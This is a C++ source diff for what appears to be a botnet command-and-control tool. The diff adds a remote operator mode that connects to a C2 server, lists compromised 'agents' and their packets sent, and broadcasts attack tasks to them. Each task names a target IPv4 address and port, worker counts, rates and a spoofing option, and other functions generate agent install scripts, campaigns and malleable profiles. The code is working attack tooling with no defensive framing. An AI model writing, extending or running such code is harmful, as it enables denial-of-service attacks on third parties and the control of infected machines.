@@ -2,7 +2,9 @@
 
 #include "app/application.hpp"
 #include "common/network_interfaces.hpp"
+#include "common/platform.hpp"
 #include "config/settings_store.hpp"
+#include "remote/operator_client.hpp"
 #ifdef QEVORYX_ENABLE_C2
 #include "server/c2_config.hpp"
 #include "server/server.hpp"
@@ -97,6 +99,22 @@ public:
             result.c2.template_ids = c2_server_->list_templates();
         }
 #endif
+        if (remote_connected_) {
+            refresh_remote_locked();
+            result.c2.remote = true;
+            result.c2.server_running = true;
+            result.c2.server_port = remote_port_;
+            result.c2.remote_host = remote_host_;
+            result.c2.agents = remote_agents_;
+            result.c2.agent_connected = static_cast<std::uint32_t>(remote_agents_.size());
+            std::uint32_t busy = 0;
+            for (const auto& a : remote_agents_)
+                if (!a.idle) ++busy;
+            result.c2.agent_busy = busy;
+            result.c2.agent_idle = result.c2.agent_connected - busy;
+            result.c2.uptime_sec = remote_status_.uptime_sec;
+            result.c2.total_connections_accepted = remote_status_.total_connections;
+        }
 
         return result;
     }
@@ -203,6 +221,10 @@ public:
 #ifdef QEVORYX_ENABLE_C2
     void c2_start_server(std::uint16_t port, const std::string& psk) override {
         std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) {
+            log(ui::Severity::Error, "Remote connected - disconnect first (F4).");
+            return;
+        }
         if (c2_server_running_) return;
 
         c2_port_ = port;
@@ -234,6 +256,10 @@ public:
     void c2_stop_server() override {
         {
             std::lock_guard<std::mutex> lock(c2_mutex_);
+            if (remote_connected_) {
+                disconnect_remote_locked();
+                return;
+            }
             if (!c2_server_running_) return;
             c2_server_running_ = false;
             if (c2_server_) c2_server_->stop();
@@ -253,6 +279,10 @@ public:
                            int mode_index, std::uint32_t workers, std::uint32_t rate,
                            bool spoof) override {
         std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) {
+            remote_dispatch_locked(target, port, mode_index, workers, rate);
+            return;
+        }
         if (!c2_server_ || !c2_server_running_) return;
 
         c2::TaskPayload task{};
@@ -289,6 +319,10 @@ public:
         ui::Severity sev = ui::Severity::Success;
         {
             std::lock_guard<std::mutex> lock(c2_mutex_);
+            if (remote_connected_) {
+                log(ui::Severity::Error, "Targeted dispatch unavailable in remote mode");
+                return;
+            }
             if (!c2_server_ || !c2_server_running_) return;
 
             c2::TaskPayload task{};
@@ -320,6 +354,11 @@ public:
 
     void c2_stop_task(const std::string& agent_id) override {
         std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) {
+            (void)agent_id;
+            remote_stop_all_locked();
+            return;
+        }
         if (!c2_server_ || !c2_server_running_) return;
         if (!agent_id.empty()) {
             // Targeted stop: cancel the selected agent's current task if any.
@@ -343,6 +382,7 @@ public:
 
     std::string c2_install_script() const override {
         std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) return "# Not available in remote mode";
         if (!c2_server_) return "# Start the server first to generate install script";
         return c2_server_->generate_install_script();
     }
@@ -355,6 +395,10 @@ public:
         ui::Severity sev = ui::Severity::Success;
         {
             std::lock_guard<std::mutex> lock(c2_mutex_);
+            if (remote_connected_) {
+                log(ui::Severity::Error, "Not available in remote mode");
+                return;
+            }
             if (!c2_server_ || !c2_server_running_) return;
             server::CampaignStep step;
             step.name = name.empty() ? "step-1" : name;
@@ -383,6 +427,10 @@ public:
         ui::Severity sev = ui::Severity::Success;
         {
             std::lock_guard<std::mutex> lock(c2_mutex_);
+            if (remote_connected_) {
+                log(ui::Severity::Error, "Not available in remote mode");
+                return;
+            }
             if (!c2_server_ || !c2_server_running_) return;
             if (name.empty()) return;
             server::MalleableProfile p;
@@ -398,35 +446,185 @@ public:
         if (events_.size() > 100) events_.pop_front();
     }
 #else
-    // Public (open-source) build: C2 engine not included. All C2 calls are
-    // safe no-ops so local mode keeps working.
+    // Public (open-source) build: C2 engine not included. Remote operator
+    // mode still works (no engine needed); everything else is a safe no-op.
     void c2_start_server(std::uint16_t, const std::string&) override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) {
+            log(ui::Severity::Error, "Remote connected - disconnect first (F4).");
+            return;
+        }
         log(ui::Severity::Error, "C2 server not included in this build");
     }
-    void c2_stop_server() override {}
-    void c2_broadcast_task(const std::string&, std::uint16_t, int, std::uint32_t, std::uint32_t,
-                           bool) override {
+    void c2_stop_server() override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) disconnect_remote_locked();
+    }
+    void c2_broadcast_task(const std::string& target, std::uint16_t port, int mode_index,
+                           std::uint32_t workers, std::uint32_t rate, bool) override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) {
+            remote_dispatch_locked(target, port, mode_index, workers, rate);
+            return;
+        }
         log(ui::Severity::Error, "C2 server not included in this build");
     }
     void c2_send_task_to_agent(const std::string&, const std::string&, std::uint16_t, int,
                                std::uint32_t, std::uint32_t, bool) override {
-        log(ui::Severity::Error, "C2 server not included in this build");
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        log(ui::Severity::Error, remote_connected_ ? "Targeted dispatch unavailable in remote mode"
+                                                   : "C2 server not included in this build");
     }
-    void c2_stop_task(const std::string&) override {}
+    void c2_stop_task(const std::string&) override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) remote_stop_all_locked();
+    }
     std::string c2_install_script() const override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (remote_connected_) return "# Not available in remote mode";
         return "# C2 server not included in this build";
     }
     void c2_create_campaign(const std::string&, const std::string&, std::uint16_t, int,
                             std::uint32_t, std::uint32_t, std::uint32_t) override {
-        log(ui::Severity::Error, "C2 server not included in this build");
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        log(ui::Severity::Error, remote_connected_ ? "Not available in remote mode"
+                                                   : "C2 server not included in this build");
     }
     void c2_add_malleable(const std::string&, const std::string&, const std::string&,
                           const std::string&) override {
-        log(ui::Severity::Error, "C2 server not included in this build");
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        log(ui::Severity::Error, remote_connected_ ? "Not available in remote mode"
+                                                   : "C2 server not included in this build");
     }
 #endif
 
+    // ── Remote operator mode (public client; works in both trees) ──
+
+    bool c2_remote_connected() const override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        return remote_connected_;
+    }
+
+    std::string c2_connect_remote(const std::string& host, std::uint16_t port,
+                                  const std::string& token) override {
+        if (host.empty() || port == 0 || token.empty()) return "Host, port and token required.";
+        if (token.size() > 512) return "Token too long.";
+        {
+            std::lock_guard<std::mutex> lock(c2_mutex_);
+            if (c2_server_running_) return "Stop the local server first.";
+            remote_client_.configure(host, port, token, 3000);
+            remote::StatusInfo st;
+            remote::Result r = remote_client_.get_status(st);
+            if (!r.ok) {
+                std::string why = r.error.empty() ? ("HTTP " + std::to_string(r.http_code))
+                                                  : r.error;
+                log(ui::Severity::Error, "Remote connect failed: " + why);
+                return "Connect failed: " + why;
+            }
+            remote_connected_ = true;
+            remote_host_ = host;
+            remote_port_ = port;
+            remote_token_ = token;
+            remote_last_fetch_ = std::chrono::steady_clock::time_point{};
+            log(ui::Severity::Success, "Remote connected to " + host + ":" + std::to_string(port));
+        }
+        return "";
+    }
+
+    void c2_disconnect_remote() override {
+        std::lock_guard<std::mutex> lock(c2_mutex_);
+        if (!remote_connected_) return;
+        disconnect_remote_locked();
+    }
+
 private:
+    // Caller holds c2_mutex_.
+    void disconnect_remote_locked() {
+        remote_connected_ = false;
+        remote_client_ = remote::OperatorClient{};
+        remote_agents_.clear();
+        log(ui::Severity::Warning, "Remote disconnected");
+    }
+
+    // Caller holds c2_mutex_. Throttled to 1s; const so snapshot() can use it.
+    void refresh_remote_locked() const {
+        const auto now = std::chrono::steady_clock::now();
+        if (now - remote_last_fetch_ < std::chrono::seconds(1)) return;
+        remote_last_fetch_ = now;
+        remote::StatusInfo st;
+        if (remote_client_.get_status(st).ok) remote_status_ = st;
+        std::vector<remote::AgentInfo> agents;
+        if (remote_client_.get_agents(agents).ok) {
+            remote_agents_.clear();
+            remote_agents_.reserve(agents.size());
+            for (const auto& a : agents) {
+                ui::AgentSnapshot snap;
+                snap.id = a.id;
+                snap.hostname = a.hostname.empty() ? a.id.substr(0, 8) : a.hostname;
+                snap.os = "";
+                if (a.status == 3) {
+                    snap.status = "Idle";
+                    snap.idle = true;
+                } else if (a.status == 4) {
+                    snap.status = "Busy";
+                    snap.idle = false;
+                } else {
+                    snap.status = "Connected";
+                    snap.idle = false;
+                }
+                snap.packets_sent = a.packets_sent;
+                remote_agents_.push_back(std::move(snap));
+            }
+        }
+    }
+
+    // Caller holds c2_mutex_.
+    void remote_dispatch_locked(const std::string& target, std::uint16_t port, int mode,
+                                std::uint32_t workers, std::uint32_t rate) {
+        struct in_addr addr{};
+        if (inet_pton(AF_INET, target.c_str(), &addr) != 1) {
+            log(ui::Severity::Error, "Invalid target IPv4 address.");
+            return;
+        }
+        if (port == 0) {
+            log(ui::Severity::Error, "Port must be from 1 to 65535.");
+            return;
+        }
+        std::vector<std::uint32_t> ids;
+        remote::Result r =
+            remote_client_.dispatch(target, port, mode, workers, rate, 0, ids);
+        if (!r.ok) {
+            std::string why = !r.body.empty() && r.body.size() < 128 ? r.body
+                              : r.error.empty() ? ("HTTP " + std::to_string(r.http_code))
+                                                : r.error;
+            log(ui::Severity::Error, "Remote dispatch failed: " + why);
+            return;
+        }
+        remote_last_fetch_ = std::chrono::steady_clock::time_point{};
+        if (ids.empty()) {
+            log(ui::Severity::Warning, "Remote accepted task but no idle agents");
+        } else {
+            log(ui::Severity::Success,
+                "Remote task " + std::to_string(ids.front()) + " dispatched");
+        }
+    }
+
+    // Caller holds c2_mutex_.
+    void remote_stop_all_locked() {
+        std::vector<remote::TaskInfo> tasks;
+        remote::Result r = remote_client_.get_tasks(tasks);
+        if (!r.ok) {
+            log(ui::Severity::Error, "Remote stop failed: cannot list tasks");
+            return;
+        }
+        std::size_t stopped = 0;
+        for (const auto& t : tasks) {
+            if (t.state == 3 || t.state == 4 || t.state == 5) continue;  // terminal
+            if (remote_client_.stop_task(t.id).ok) ++stopped;
+        }
+        remote_last_fetch_ = std::chrono::steady_clock::time_point{};
+        log(ui::Severity::Info, "Remote stop requested (" + std::to_string(stopped) + " tasks)");
+    }
     static constexpr auto interface_refresh_interval = std::chrono::seconds(5);
 
     static std::string timestamp() {
@@ -555,6 +753,16 @@ private:
     std::uint16_t c2_port_{7777};
     std::string c2_psk_;
     std::vector<ui::AgentSnapshot> c2_agents_snapshot_;
+
+    // Remote operator mode (public client; no engine required).
+    remote::OperatorClient remote_client_;
+    bool remote_connected_{false};
+    std::string remote_host_;
+    std::uint16_t remote_port_{0};
+    std::string remote_token_;
+    mutable std::vector<ui::AgentSnapshot> remote_agents_;
+    mutable remote::StatusInfo remote_status_;
+    mutable std::chrono::steady_clock::time_point remote_last_fetch_{};
 };
 
 } // namespace
